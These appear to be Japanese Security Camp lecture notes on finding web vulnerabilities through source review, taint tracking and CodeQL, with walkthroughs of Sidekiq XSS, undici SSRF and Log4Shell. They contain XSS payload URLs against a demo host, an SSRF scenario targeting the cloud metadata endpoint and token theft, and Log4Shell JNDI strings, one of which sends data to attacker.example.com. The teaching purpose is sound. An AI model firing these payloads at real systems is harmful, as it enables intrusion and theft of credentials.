# B6: ソースコード解析によるWebアプリケーションの脆弱性調査

# 講師

## 西谷
- GMOサイバーセキュリティ byイエラエ所属
    - 前職: Yahoo! JAPAN
    - 前職では社内セキュリティプロダクト開発

- SNS
    - X: @no1zy_sec

- セキュリティ・キャンプ2022講師

## 山崎
- GMOサイバーセキュリティ byイエラエ所属
    - 前職: LINE株式会社
    - 前職でも現職でもソースコード読んでバグ探しをしている

- SNS
    - X: @tyage
    - WebFinger: @blog.tyage.net@blog.tyage.net

- セキュリティキャンプ2010卒業生
    - キャンプでCTFに触れて未だにCTFやってます
- セキュリティ・キャンプ2022講師

# 予定表

08/10

| 時間          |                  |
| ------------- | ---------------- |
| 8:30 - 9:00   | イントロ         |
| 9:00 - 9:20   | 脆弱性調査 Part1 |
| 9:20 - 9:40   | 脆弱性調査 Part2 |
| 9:40 - 10:00  | 脆弱性調査 Part3 |
| 10:00 - 10:15 | 休憩             |
| 10:15 - 10:45 | CodeQL           |
| 10:45 - 11:15 | 実践CodeQL Part1 |
| 11:15 - 11:45 | 実践CodeQL Part2 |
| 11:45 - 12:15 | 実践CodeQL Part3 |


# ソースコード解析によるWebアプリケーションの脆弱性調査

「Webセキュリティクラス」なのでWebアプリケーションの話が中心

* Webアプリ自体の脆弱性
* Webアプリでよく利用されるライブラリの脆弱性

## ソースコードから脆弱性を見つけられると便利

* 開発時
  * このコード、この設計安全？
  * このOSSでこの使い方してて大丈夫なんだっけ？ -> OSSの調査をしよう
* セキュリティエンジニアとして脆弱性を探す視点
  * ソースコードがなくても、もしここでこういうコードだったら脆弱性になるよなという想像ができるようになる
  * OSSやクライアントサイドのコード、診断中に手に入れたソースコードを調査することができるようになる

### どうすれば？

ソースコード見ながら脆弱性を見つけるには、脆弱性の知識だけでなくプラットフォーム（Webならブラウザとかクラウドサービスとか）・言語・ライブラリ・フレームワークの知識が要求される。
ベストプラクティスに沿っているか、誤った使い方をしていないか、一般的な実装と今見てるコードとはどういう点が違うのか、も重要な観点。
（あ、これCTFで見たことあるやつだ！も結構あります。）

もちろん静的解析だけでなく実際に動作させてデバッグしたり動作確認することから得られる情報も多い。
どう使われているのか・何が想定された挙動なのか想像すること（リバースエンジニアリングっぽいこと）が必要になる場合も。

色々書きましたが、宝探しだと思って楽しめれば大丈夫！

本日のテーマ

- 実際のアプリケーションで存在した脆弱性を参考に調査をしてみよう
- 静的解析ツール(CodeQL)に触れてみよう

### 静的解析で見つけやすい脆弱性

静的解析だけで見つけやすい脆弱性、見つけるのが難しい脆弱性があるので、そこは念頭に...
可能なら実際の動作環境にアクセスして行う動的解析と組み合わせるとよい

[OWASP TOP 10 <2021>](https://owasp.org/Top10/ja/)の個人的な所感
OWASP TOP 10: 発生率や影響、悪用のしやすさ等のデータを基に選定された10個の脆弱性と脅威

|                                                     | 静的解析(手動) | SASTツール | 備考                                                                                                                                              |
| --------------------------------------------------- | -------- | ---------- | ------------------------------------------------------------------------------------------------------------------------------------------------- |
| A01:2021-アクセス制御の不備                         | ◯        | ✗          | 仕様がないと判断できない脆弱性なので、ソースコード+SASTツールだけでは一般に検知が難しいかも                                                       |
| A02:2021-暗号化の失敗                               | ◯        | ◯          | サーバの証明書のような運用上の暗号化関連部分はソースコードに記述がないことも多いので検知が難しいかも                                              |
| A03:2021-インジェクション                           | ◎        | ◎          | Taint Trackingで検知できる。                |
| A04:2021-安全が確認されない不安な設計               | ◯        | △          | 仕様に関連する脆弱性なので、ソースコード+SASTツールだけでは一般に検知が難しいかも。ただし、一般にセキュアでないデザインパターンは検知できるかも。 |
| A05:2021-セキュリティの設定ミス                     | ◯        | ◯          | 運用に関する設定はソースコード中に記述がないので検知が難しいかも                                                                                  |
| A06:2021-脆弱で古くなったコンポーネント             | ◎        | ◎          | パッケージ管理ツールで管理されていれば検知しやすい。                                                                                              |
| A07:2021-識別と認証の失敗                           | ◯        | △          | 認証ロジックの検知は◯。運用時に弱いパスワードが設定されているのは検知難しい✗。                                                                    |
| A08:2021-ソフトウェアとデータの整合性の不具合       | ◯        | ◯          | 安全でないデシリアライゼーションは◯                                                                                                               |
| A09:2021-セキュリティログとモニタリング             | ◎        | ◯          | 動的解析では逆に検知しづらい項目                                                                                                                  |
| A10:2021-サーバーサイドリクエストフォージェリ(SSRF) | ◎        | ◎          |                                                                                                                                                   |

※個人的な所感です
※カテゴリの中でも見つけやすいもの、見つけにくいものがあります

→ 今回は、ユーザが入力したデータがコンテキストに応じたエスケープをされずに直接または別のデータと連結されて利用されてしまう、**インジェクションの脆弱性**の静的解析を中心に見ていきます。
サービスの運用方法や仕様に関わらずに脆弱性を検知できることが多いので、ツールで検知しやすい。
実際に発生する脆弱性の中でカバーできる範囲もそこそこ大きい。

### 他人のサービスや広く利用されてるプロダクトで脆弱性を見つけたら...?

直接報告するのが難しい場合、我らがIPAに報告窓口があります!

https://www.ipa.go.jp/security/todokede/vuln/uketsuke.html

広く利用されているソフトウェアの脆弱性であれば、CVEが発行されることも。

# CVE

CVE: Common Vulnerabilities and Exposures
脆弱性の識別番号

今回の講義では、CVE番号の発行された脆弱性をいくつか取り上げます。

脆弱性の発見されたプロダクト
ソフトウェアのバージョン
脆弱性概要/種類
参考情報

などの情報がまとめられている。

CVEは広く利用されているソフトウェアの脆弱性に対するものなので、一企業が運用している個別のWebサイト（twitter.comとか）の脆弱性には基本的に採番されない。
https://www.cve.org/ResourcesSupport/AllResources/CNARules#section_7-4_requirements_for_assigning_a_cve_id

2022年のCVE発行数は25227件。
（最近は機械的な報告もあって増えてきた。）

https://www.cvedetails.com/browse-by-date.php

![](https://tyage.github.io/seccamp-2023-images/upload_dcdd40a0d9b6b53e64586bbd8d604ef0.png)

最新CVEを1個見てみよう
https://twitter.com/CVEnew

## CVE以外の脆弱性識別番号

会社や機関も個別に採番してることがあります。
共通の識別番号としてのCVE。

- CERT/CC: VU#12345678
- JVN: JVN#12345678, JVNVU#12345678, JVNTA#12345678
- GitHub: GHSA-ab12-cd34-ef56
- Mozilla: MFSA 2023-01
- Red Hat: RHSA-2023:0001
- 横河電機株式会社: YSAR-23-0001


## CVEの探し方

CVE探すソース

* [CVE.org](https://www.cve.org/)
* [CVE details](https://www.cvedetails.com/)
* [JVN iPedia](https://jvndb.jvn.jp/)
* [GitHub Advisories](https://github.com/advisories)
    * リポジトリの場所やdiff、issue、pull requestが書かれている可能性が高い
    * reviewタグがあるので嘘CVEを弾ける
* Hackerone, bugcrowd, ...
    * バグバウンティプラットフォーム
* huntr.dev
    * OSSのバグバウンティプラットフォーム
    * 一般にOSSにバグ報告しても報奨金はもらえないが、OSSごとに寄付を集めて、脆弱性報告した人がそこから報奨金を受け取れる仕組み
    * 仮に報奨金が受け取れなくとも、OSSメンテナへの連絡をhuntr.devが行ってくれるので報告者目線では便利
        * 最近はGitHub上で脆弱性報告できる仕組みが整えられてきたけれど
    * PoC（Proof of Concept: 攻撃が成功することを証明するプログラムや証跡）があるのですぐに脆弱性が分かるかも
* ChatGPT

## 余談: 嘘CVE

CVEが発行されていても確実に脆弱性があるとは限らない。

報告者がかなり盛った報告をし、開発者やCVE発行者がちゃんと確認せずに発行する場合もある。

嘘CVEとまではいかなくとも、おかしなリスク評価値(CVSS)がつけられていることも。

ソースコードを読み解いて脆弱性を探す技術があれば、脆弱性が本当に存在するか見抜きやすい...かも

最近の嘘CVE事件

### CVE-2022-32276
jsonwebtokenというパッケージにRCEが見つかった（とされた）。

2万を超えるパッケージが利用しており、ちょっとした騒ぎに。

修正コミットを読んでみても、特に脆弱性の対策が行われている雰囲気はない...
https://github.com/auth0/node-jsonwebtoken/commit/e1fa9dcc12054a8681db4e6373da1b30cf7016e3

報告した会社がヤバい脆弱性を見つけたとアピール。
→ これは脆弱性なのか???と話題に

![](https://tyage.github.io/seccamp-2023-images/upload_11de060cac34242ee9b6cd85af8c2f85.png)
https://twitter.com/unit42_jp/status/1612976481579286531
https://unit42.paloaltonetworks.jp/jsonwebtoken-vulnerability-cve-2022-23529/

ライブラリのメソッド `jwt.verify`　の引数に `{ toString: () => console.log('PWNED!') }` オブジェクトを渡せば関数が実行されるというPoC(実証コード)が貼られていた。

![](https://tyage.github.io/seccamp-2023-images/upload_b6af86721d5fd04e76997ce016eedefb.png)

通常、開発者以外がこのようなオブジェクトを仕込むことは困難。
もしこれが脆弱性なら、ただの処理系標準の `console.log` やありとあらゆるライブラリが脆弱性になってしまう。

「This CVE is a joke」と炎上し、このCVEは無事に取り下げられた。
（CVEがRejectされることはそんなに多くないためこれはレアケース。）

https://github.com/github/advisory-database/pull/1595

![](https://tyage.github.io/seccamp-2023-images/upload_7104917582f69150b6071e3560c5bdb8.png)


### CVE-2022-32276, CVE-2022-32275

> Grafana 8.4.3 allows reading files via (for example) a /dashboard/snapshot/%7B%7Bconstructor.constructor'/.. /.. /.. /.. /.. /.. /.. /.. /etc/passwd URI.

脆弱性の内容は一見サーバ内部の /etc/passwd ファイルをリモートから読めるLFIのように見えるが...

実際にはログインしていなくても404 Not Foundの画面を見ると「ナビゲーションバーが表示される」という内容。

ログインしていなくてもナビゲーションバーが表示されるのはおかしい！という主張。
（UI上表示されるだけで、実際にデータにアクセスできるわけではない。）

![](https://user-images.githubusercontent.com/20999846/173608475-5ead4e2e-ce14-48ab-b42d-4a74809ae106.png)

PoCとされたもの: https://github.com/BrotherOfJhonny/grafana/tree/d5b5d463114e127d1139a277ec05511c24aeac33

MITREがなぜかCVEを発行してしまったため、Grafana公式にこれは脆弱性ではないと説明をすることに。
CVEの説明文は更新されたものの、現在も取り下げられてはいない。

https://grafana.com/blog/2022/06/07/cve-2022-32276-and-cve-2022-32275-no-current-evidence-of-security-impact/

## Taint Tracking

これから行う調査ではユーザが送信した脆弱性を引き起こしうる値が、アプリケーション内でどう伝搬していくかを追っていきます。
このような手法はTaint Trackingと呼ばれており、Webアプリケーションで脆弱性を見つける上で有効な手法の一つです。

外部から送信されるパラメータをソース(source)🚰と呼ぶ。
- `req.query["foobar"]` 
- `$_POST["foobar"]` 
- ...

外部入力値が入ると脆弱性となりうる箇所をシンク(sink)🪣と呼ぶ。
- `process.execSync(...)` 
- `db.query(...)`
- ...

ソース🚰から開始するデータが流れる場所をTaint(汚染)されたポイントとみなし、コードの処理を追いながら最終的に汚染されたデータがシンク🪣に辿り着くか探していく。
ざっくり言うとソース🚰 -> シンク🪣となる流れ（Data flow）を探していく感じ。

```javascript
// 1. username` が汚染される
const username = req.query["username"]

// 2. `date` は外部のパラメータではないので汚染されていない
const date = new Date()

// 3. `query` が汚染される
const query = `SELECT * FROM users WHERE username = '${username}'`

// 4. 汚染された `query` が `db.query` に入るのでSQLインジェクションが起きる！
db.query(query)
```

source
🚰 `🍄req.query["username"]`  ->
💧 `username = 🍄req.query["username"]` ->
💧 ``query = `SELECT ... ${🍄username}` `` ->
🪣 `db.query(🍄query)` 
sink

#### 逆向きTaint Tracking

シンク🪣からソース🚰を探すこともあります。
明らかに怪しい関数(evalとか)を検索して、そのコードブロックの呼び出し元、影響した変数などを辿っていく。

シンク🪣から辿った方が効率的な場合もあれば、そうでない場合もあります。
(関係する変数が多数ある、特殊な呼ばれ方をしていて呼び出し元が分かりづらい場合とか)

個人的にはシンク🪣に至るフローをいくつか把握しておいて、ソース🚰から探索を行う、といったやり方をすることが多いかも？

# CVEから脆弱性の詳細を調査してみよう

## (Ruby) CVE-2023-1892

Sidekiqの脆弱性 クロスサイトスクリプティング
Sidekiqはバックグランドで非同期ジョブを処理するためのフレームワーク
Webダッシュボード機能があり、Webからアクセスすることでジョブのモニター、管理等ができる

![](https://tyage.github.io/seccamp-2023-images/upload_35c024dea5e019addc585e56baf435ab.png)


画面確認用(診断ツール等は実行しないでください)
http://ec2-43-207-225-198.ap-northeast-1.compute.amazonaws.com:3000/sidekiq

### 課題1: CVE-2023-1892の調査
この調査でやること
* どのように修正されたか調査する
* ソースとシンクについて特定する

https://nvd.nist.gov/vuln/detail/CVE-2023-1892

(調査時間: 10分)
（ChatGPT使うのも可）

<details>
<summary>!!Spoiler Alert!!</summary>

![](https://tyage.github.io/seccamp-2023-images/upload_7d8eb70b755b4718704f269eb4963584.png)

GitHubのリンクとhuntr.devのリンクがある
https://github.com/sidekiq/sidekiq/commit/458fdf74176a9881478c48dc5cf0269107b22214
https://huntr.dev/bounties/e35e5653-c429-4fb8-94a3-cbc123ae4777/

まずはGitHubから

```ruby
    get "/metrics" do
       q = Sidekiq::Metrics::Query.new
       @period = params[:period]
       @periods = METRICS_PERIODS 
```

これが以下に修正されている

```ruby
    get "/metrics" do
       q = Sidekiq::Metrics::Query.new
       @period = h((params[:period] || "")[0..1])
       @periods = METRICS_PERIODS
```

「h」によってHTMLエスケープすることで修正を行なっている
→ ということはこのパラメータ「params[:period]」がクロスサイトスクリプティングの原因？

修正前バージョンは7.07
https://github.com/sidekiq/sidekiq/blob/v7.0.7/lib/sidekiq/web/application.rb

出力箇所
https://github.com/sidekiq/sidekiq/blob/v7.0.7/web/views/metrics.erb#L65C22-L65C22

```erb
                  <%= visible_kls.include?(kls) ? 'checked' : '' %>
                />
                <code><a href="<%= root_path %>metrics/<%= kls %>?period=<%= @period %>"><%= kls %></a></code>
              </div>
              <script>jobMetricsChart.registerSwatch("<%= id %>")</script>
```

https://github.com/sidekiq/sidekiq/blob/v7.0.7/web/views/metrics_for_job.erb#L20

```erb
  <div class="header-container">
    <div class="page-title-container">
      <h1>
        <a href="<%= root_path %>metrics?period=<%= @period %>"><%= t('Metrics') %></a> /
        <%= h @name %>
      </h1>
```
            
`/metrics`または`/metrics/:name`のパラメータ「period」に対してJavaScriptを実行するようなHTMLタグを挿入することでクロスサイトスクリプティングが発生することがわかった

http://ec2-43-207-225-198.ap-northeast-1.compute.amazonaws.com:3000/sidekiq/metrics?period=%22%3E%3Cscript%3Ealert(1)%3C/script%3E
            
http://ec2-43-207-225-198.ap-northeast-1.compute.amazonaws.com:3000/sidekiq/metrics/SampleJob?period=%22%3E%3Cscript%3Ealert(1)%3C/script%3E
            
</details>


## (JavaScript) CVE-2022-35949

undiciの脆弱性 SSRF

https://nvd.nist.gov/vuln/detail/CVE-2022-35949


### 課題2: CVE-2022-35949の調査
調査タスク: 
- undiciライブラリのどのオプションがソース🚰でしょうか
- どういった攻撃が想定できますか？

(調査時間: 10分)

<details>
<summary>!!Spoiler Alert!!</summary>

修正コミット
https://github.com/nodejs/undici/commit/124f7ebf705366b2e1844dff721928d270f87895

```javascript
url = new URL(opts.path, util.parseOrigin(url))
```
↓修正後
```javascript
let path = opts.path
if (!opts.path.startsWith('/')) {
  path = `/${path}`
}

url = new URL(util.parseOrigin(url).origin + path)
```

:thinking_face: 

URLの第一引数にpath, 第二引数にoriginを渡す形式から、文字列結合するコードになっている。

コメントによると、 `new URL(path, origin)` は `path` が絶対URLの時に `origin` が無視される...らしい。
https://developer.mozilla.org/en-US/docs/Web/API/URL/URL

```javascript
    // new URL(path, origin) is unsafe when `path` contains an absolute URL
     // From https://developer.mozilla.org/en-US/docs/Web/API/URL/URL:
     // If first parameter is a relative URL, second param is required, and will be used as the base URL.
     // If first parameter is an absolute URL, a given second param will be ignored.
```

以下のコードを試してみると、originを指定しているのに確かに無視されますね！

```javascript
console.log(new URL('//localhost:9999', 'http://localhost:3000')) // => http://localhost:9999
```

diffにはテストコードも追加されています。

```javascript
 test('protocol-relative URL as pathname should be included in req.path', async (t) => {
   const pathServer = createServer((req, res) => {
     t.fail('it shouldn\'t be called')
     res.statusCode = 200
     res.end('hello')
   })

   const requestedServer = createServer((req, res) => {
     t.equal(`//localhost:${pathServer.address().port}`, req.url)
     t.equal('GET', req.method)
     t.equal(`localhost:${requestedServer.address().port}`, req.headers.host)
     res.statusCode = 200
     res.end('hello')
   })

   t.teardown(requestedServer.close.bind(requestedServer))
   t.teardown(pathServer.close.bind(pathServer))

   await Promise.all([
     requestedServer.listen(0),
     pathServer.listen(0)
   ])

   const noSlashPathname = await request({
     method: 'GET',
     origin: `http://localhost:${requestedServer.address().port}`,
     pathname: `//localhost:${pathServer.address().port}`
   })
   t.equal(noSlashPathname.statusCode, 200)
```

どうやらこの脆弱性には `path` や `origin` 、そして `new URL` の仕様が関係していそうです。

undiciはライブラリなので、どう呼び出されるかも見てみよう。

[ドキュメント](https://undici.nodejs.org/) を見るとこういう使い方をするみたいです。
    
```javascript
import { request } from 'undici'

await request('http://localhost:3000/foo')
```

undiciのrequest第一引数には `UrlObject` が指定できるようになっているようです。
https://undici.nodejs.org/#/?id=undicirequesturl-options-promise

先程のテストコードはこれを利用しているようですね。

```javascript
   const noSlashPathname = await request({
     method: 'GET',
     origin: `http://localhost:${requestedServer.address().port}`,
     pathname: `//localhost:${pathServer.address().port}`
   })
```

`request({ origin: 'http://localhost:3000', pathname: '//localhost:9999' })`
のようなコードが修正前のバージョンで実行された場合を考えてみましょう。

修正前のコードを追っていくと [lib/core/util.jsの118行目](https://github.com/nodejs/undici/commit/124f7ebf705366b2e1844dff721928d270f87895#diff-e0a4e92ad66667607d700021123bf26260711f87fda60b44f6867a3f22087410L118) で `new URL('//localhost:9999', 'http://localhost:3000')` が実行されそうです。

コメントにあった `new URL` の仕様から、これだと第二引数が無視されて `http://localhost:9999` が返ってしまいます。

本来であれば `http://localhost:3000//localhost:9999` にリクエストが送信されていて欲しいところ、バグによって `http:///localhost:9999` にリクエストが飛んでしまいそうです。

どうやらこれがSSRFの脆弱性に繋がっているみたいです！
実際どういう被害が発生しうるかについても少し考えてみましょう。

例えば郵便番号から住所を検索するAPIを利用するために、undiciを利用して以下のような実装したとします。

```javascript
// 住所検索APIサービスを利用する
// 例: http://juushokensaku.api/101-0001
function search(req, res) {
    const result = request({
        origin: 'http://juushokensaku.api',
        path: req.params.yuubinbango
    }, headers: {
        'Authorization': `Bearer ${apiToken}`
    })
}
```

この場合、 `req.params.yubinbango` はユーザが入力した値で、通常は `101-0001` のような郵便番号が入ると想定されます。
もしこの値がSSRFでよく頻出する `http://169.254.169.254/latest/api/token` のようなURLだと、サーバ内部からしか本来アクセスできない場所にアクセスできてしまいます。

それ以外にも、 `https://seccamp-hacker.site/` のようなURLが入っていると、HTTPリクエストが `seccamp-hacker.site` に送信されてしまいます。
リクエストの `Authorization` ヘッダには `apiToken` が含まれているので、これが盗まれてしまいそうです。

このように修正コミットだけでなく、テストコードも参考になるかもしれません。
また、ライブラリの脆弱性の場合、ライブラリがどういった使い方をされているか想像することも重要ですね。

</details>


## (Java) Log4shell
### Log4shellとは
Javaで最もポピュラーなログライブラリの一つであるLog4jで発見されたJNDIインジェクションによる任意コード実行が可能な脆弱性。
ログとして出力するデータ内にユーザの入力値が含まれる場合に発生し、攻撃の容易さとAmazon AWS、Cloudflare、iCloud、JavaバージョンのMinecraft、Steamなど影響範囲が相当なものであったことで有名。


### log4j2の利用方法
```java
package org.example;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;


public class Test {
    
  private static final Logger logger = LogManager.getLogger(Test.class);
    
  public static void main(String[] args) {
    logger.info("LOG TEST"); 
  }
}
```

出力結果
```
[2023-08-05 23:49:04.984], INFO , main, org.example.Test, LOG TEST
```


### JNDIインジェクションの例
context.lookup（）等の引数にユーザ入力値がそのまま入ると外部ファイルからJavaクラスをロードすることができ任意コード実行ができる

JNDIインジェクションのexploitについては以下も参考
https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf

```Java
import javax.naming.InitialContext
import javax.naming.NamingException;


public class Test {
        
  public static void main(String[] args) throws NamingException {
    InitialContext context = new InitialContext();
    context.lookup("ldap://{HOST}/ExploitObject.class")
  }
}
```


Log4shellの脆弱性が発生する実装例
```java
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;


public class Test {
    
  private static final Logger logger = LogManager.getLogger(Test.class);
    
  public static void main(String[] args) {
    logger.info("${jndi:ldap://127.0.0.1/a}");
    logger.info("${jndi:dns://${env:USER}.attacker.example.com/a}"); // <JVM実行ユーザ>.attacker.example.comにDNSクエリが発生する

  }
}
```

### 課題3: CVE-2021-44228の調査
この調査でやること
* ソースとシンクについて特定する

### CVE-2021-44228
https://github.com/apache/logging-log4j2/commit/6cfd08511c822f7f28f6723042d2c697f90e0fb8


以下の修正コミットから当たりをつけてシンクを調査してみよう(10分)
※事前に静的解析環境を整えているか、動的解析しないと難しいと思うのでできなくても大丈夫
後のパートでCodeQLクエリを作成するので、そこで読んでいく予定です

https://github.com/apache/logging-log4j2/pull/608/commits
LDAPスキームや通信先のホスト検証を行う修正

Log4j 2.14.1 のソースコード 
https://github.com/apache/logging-log4j2/tree/rel/2.14.1

![](https://tyage.github.io/seccamp-2023-images/upload_d3935cc17511f9e6699ead619d23bc84.png)

`new InitialContext(data)`をnew JndiManager()の引数に渡している箇所があり、この付近が怪しそう
![](https://tyage.github.io/seccamp-2023-images/upload_2a172929f84f4d3bd8ed68a818da91cf.png)

ここからは修正前バージョン（2.14.1）のコードを追っていく

まずは修正コミットの箇所であるcreateManager()
new JndiManagerのプロパティとしてInitialContextが渡される
https://github.com/apache/logging-log4j2/blob/rel/2.14.1/log4j-core/src/main/java/org/apache/logging/log4j/core/net/JndiManager.java#L180
```java
        @Override
        public JndiManager createManager(final String name, final Properties data) {
            try {
                return new JndiManager(name, new InitialContext(data));
            } catch (final NamingException e) {
                LOGGER.error("Error creating JNDI InitialContext.", e);
                return null;
            }
        }
    }
```

```java
public class JndiManager extends AbstractManager {
    ... 
    private JndiManager(final String name, final Context context) {
        super(null, name);
        this.context = context;
    }
```


https://github.com/apache/logging-log4j2/blob/rel/2.14.1/log4j-core/src/main/java/org/apache/logging/log4j/core/appender/AbstractManager.java#L113
```java
    public static <M extends AbstractManager, T> M getManager(final String name, final ManagerFactory<M, T> factory,
                                                              final T data) {
        LOCK.lock();
        try {
            @SuppressWarnings("unchecked")
            M manager = (M) MAP.get(name);
            if (manager == null) {
                manager = factory.createManager(name, data); // ここで呼び出される
                if (manager == null) {
                    throw new IllegalStateException("ManagerFactory [" + factory + "] unable to create manager for ["
                            + name + "] with data [" + data + "]");
                }
                MAP.put(name, manager);
            } else {
                manager.updateData(data);
            }
            manager.count++;
            return manager;
        } finally {
            LOCK.unlock();
        }
    }
```

https://github.com/apache/logging-log4j2/blob/rel/2.14.1/log4j-core/src/main/java/org/apache/logging/log4j/core/net/JndiManager.java
```java
    public static JndiManager getDefaultManager() {
        return getManager(JndiManager.class.getName(), FACTORY, null);
    }
```

ここで、JndiManagerのインスタンスを取得し、jndiManager.lookup(jndiName)を呼び出している

https://github.com/apache/logging-log4j2/blob/rel/2.14.1/log4j-core/src/main/java/org/apache/logging/log4j/core/lookup/JndiLookup.java#L56
```java
    @Override
    public String lookup(final LogEvent event, final String key) {
        if (key == null) {
            return null;
        }
        final String jndiName = convertJndiName(key);
        try (final JndiManager jndiManager = JndiManager.getDefaultManager()) {
            return Objects.toString(jndiManager.lookup(jndiName), null);
        } catch (final NamingException e) {
            LOGGER.warn(LOOKUP, "Error looking up JNDI resource [{}].", jndiName, e);
            return null;
        }
    }
```


ここがsink（脆弱性の発生箇所）になっている
https://github.com/apache/logging-log4j2/blob/rel/2.14.1/log4j-core/src/main/java/org/apache/logging/log4j/core/net/JndiManager.java#L172C31-L172C31
```java
    public <T> T lookup(final String name) throws NamingException {
        return (T) this.context.lookup(name);
    }
```

ソースの追跡を簡単に行う
JndiLookup.lookupの呼び出し元はStrSubstitutorクラス内のresolveVariableメソッドで呼び出しているが、このクラスではJNDIで利用できる構文の解析を行なっていおり処理が若干複雑なのでこの付近の説明は割愛
https://github.com/apache/logging-log4j2/blob/rel/2.14.1/log4j-core/src/main/java/org/apache/logging/log4j/core/lookup/StrSubstitutor.java

```java
    protected String resolveVariable(final LogEvent event, final String variableName, final StringBuilder buf,
                                     final int startPos, final int endPos) {
        final StrLookup resolver = getVariableResolver();
        if (resolver == null) {
            return null;
        }
        return resolver.lookup(event, variableName);
    }
```

次にソースから簡単に追っていく
https://github.com/apache/logging-log4j2/blob/rel/2.14.1/log4j-api/src/main/java/org/apache/logging/log4j/spi/AbstractLogger.java
```java
    @Override
    public void info(final CharSequence message) {
        logIfEnabled(FQCN, Level.INFO, null, message, null);
    }
```

```java
    public void logIfEnabled(final String fqcn, final Level level, final Marker marker, final CharSequence message,
            final Throwable throwable) {
        if (isEnabled(level, marker, message, throwable)) {
            logMessage(fqcn, level, marker, message, throwable);
        }
    }
```

```java
    protected void logMessage(final String fqcn, final Level level, final Marker marker, final CharSequence message,
            final Throwable throwable) {
        logMessageSafely(fqcn, level, marker, messageFactory.newMessage(message), throwable);
    }
```

```java
    protected void logMessage(final String fqcn, final Level level, final Marker marker, final CharSequence message,
            final Throwable throwable) {
        logMessageSafely(fqcn, level, marker, messageFactory.newMessage(message), throwable);
    }
```

どんどん掘っていくと以下のメソッドがあり更にメソッドが呼び出されて...となる
後のpartで自分でソース、シンクを自分で辿るので、今はシンクとソースを簡単に追いかける程度にしておく
https://github.com/apache/logging-log4j2/blob/rel/2.14.1/log4j-core/src/main/java/org/apache/logging/log4j/core/config/LoggerConfig.java
```java
    @PerformanceSensitive("allocation")
    public void log(final String loggerName, final String fqcn, final Marker marker, final Level level,
            final Message data, final Throwable t) {
        List<Property> props = null;
        if (!propertiesRequireLookup) {
            props = properties;
        } else if (properties != null) {
            props = new ArrayList<>(properties.size());
            final LogEvent event = Log4jLogEvent.newBuilder()
                    .setMessage(data)
                    .setMarker(marker)
                    .setLevel(level)
                    .setLoggerName(loggerName)
                    .setLoggerFqcn(fqcn)
                    .setThrown(t)
                    .build();
            for (int i = 0; i < properties.size(); i++) {
                final Property prop = properties.get(i);
                final String value = prop.isValueNeedsLookup() // since LOG4J2-1575
                        ? config.getStrSubstitutor().replace(event, prop.getValue()) //
                        : prop.getValue();
                props.add(Property.createProperty(prop.getName(), value));
            }
        }
        final LogEvent logEvent = logEventFactory instanceof LocationAwareLogEventFactory ?
            ((LocationAwareLogEventFactory) logEventFactory).createEvent(loggerName, marker, fqcn, requiresLocation() ?
                StackLocatorUtil.calcLocation(fqcn) : null, level, data, props, t) :
            logEventFactory.createEvent(loggerName, marker, fqcn, level, data, props, t);
```

以下がソースからシンクまでの呼び出し順となる
```
AbstractLogger.java:1299 // source
AbstractLogger.java:1300
AbstractLogger.java:1857
AbstractLogger.java:1860
AbstractLogger.java:1987
AbstractLogger.java:1989
ReusableMessageFactory.java:92
ReusableMessageFactory.java:95
AbstractLogger.java:1989
AbstractLogger.java:2139
AbstractLogger.java:2142
AbstractLogger.java:2155
AbstractLogger.java:2159
AbstractLogger.java:2202
AbstractLogger.java:2205
Logger.java:158
Logger.java:162
AwaitCompletionReliabilityStrategy.java:78
AwaitCompletionReliabilityStrategy.java:82
LoggerConfig.java:430
LoggerConfig.java:454
ReusableLogEventFactory.java:78
ReusableLogEventFactory.java:111
LoggerConfig.java:453
LoggerConfig.java:456
LoggerConfig.java:479
LoggerConfig.java:481
LoggerConfig.java:495
LoggerConfig.java:498
LoggerConfig.java:536
LoggerConfig.java:540
AppenderControl.java:80
AppenderControl.java:84
AppenderControl.java:117
AppenderControl.java:120
AppenderControl.java:126
AppenderControl.java:129
AppenderControl.java:154
AppenderControl.java:156
RoutingAppender.java:222
RoutingAppender.java:227
StrSubstitutor.java:462
StrSubstitutor.java:467
StrSubstitutor.java:911
StrSubstitutor.java:912
StrSubstitutor.java:928
StrSubstitutor.java:978
StrSubstitutor.java:911
StrSubstitutor.java:912
StrSubstitutor.java:928
StrSubstitutor.java:1033
StrSubstitutor.java:1104
StrSubstitutor.java:1110
EventLookup.java:35
EventLookup.java:41
MutableLogEvent.java:407
MutableLogEvent.java:408
EventLookup.java:41
StrSubstitutor.java:1110
StrSubstitutor.java:1033
StrSubstitutor.java:1040
StrSubstitutor.java:1040
StrSubstitutor.java:912
StrSubstitutor.java:978
StrSubstitutor.java:979
StrSubstitutor.java:979
StrSubstitutor.java:1033
StrSubstitutor.java:1104
StrSubstitutor.java:1110
JndiLookup.java:50
JndiLookup.java:54
JndiLookup.java:70
JndiLookup.java:72
JndiLookup.java:54
JndiLookup.java:56
JndiManager.java:171
JndiManager.java:172 // sink
```


---
# 〜休憩〜
---

# CodeQLで脆弱性調査を自動化！

Q. Taint Trackingって手動でやらなくても機械的にできるんじゃ...?
A. はい

(現実的にはコードの流れをちゃんと追えるか、sourceやsinkの定義の更新、sourceのvalidationやsanitizeなどの処理を見つけられるか等の問題はある。)

Taint Trackingのルールがかける代表的なSAST（Static Application Security Testing）ツール

- CodeQL
    - 今回利用します
- Semgrep
    - Proバージョン（有料）だとTaint Trackingルールがかける

実際にやってみよう

## CodeQL

GitHub社の提供するSASTツール
歴史的にはSemmle社からGitHubが買収した製品。

ソースコードからデータベースを作成して、それに対してクエリを投げて検索することができるツール。
セキュリティチェック用だけど、それ以外にも利用可能。
対応言語は C, C++, C#, Go, Java, Kotlin, JavaScript, TypeScript, Python, Ruby, Swift

リポジトリのSettings -> Code security and analysisから有効にできる。
※ただし公開リポジトリのみ。PrivateリポジトリではGitHub Enterprise + GitHub Advanced Securityを契約しないと規約上利用できない。一部のコードはOSSじゃない。

![](https://tyage.github.io/seccamp-2023-images/upload_fab6187bfd6436534168622d26e8a43f.png)

脆弱性が見つかるとこんな感じに教えてくれる。

![](https://tyage.github.io/seccamp-2023-images/upload_8f06f9989cfdacf49a01733bf8dc450e.png)

検知ルールを書いたあと、GitHub上の上位1000個のリポジトリで検知を行う機能が提供されており、自作の検知ロジックの検証やBugBountyに便利。
(GitHub提供の作成済みのデータベースに対してクエリを走らせることができるので、自分でデータベースを作らなくてよくて便利)

